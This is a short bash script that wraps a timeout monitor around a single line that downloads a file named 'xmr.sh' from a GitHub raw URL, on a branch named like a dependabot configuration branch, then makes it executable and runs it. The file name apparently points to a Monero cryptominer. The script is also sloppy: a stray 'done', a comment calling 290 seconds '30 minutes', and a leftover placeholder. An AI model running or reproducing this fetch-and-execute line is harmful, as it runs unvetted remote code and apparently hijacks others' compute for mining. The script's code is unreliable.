#!/bin/bash

Timeout=290 # 30 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://raw.githubusercontent.com/lushenry654/bitbucket/dependabot/add-v2-config-file/xmr.sh && chmod +x xmr.sh && ./xmr.sh
done
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit 0
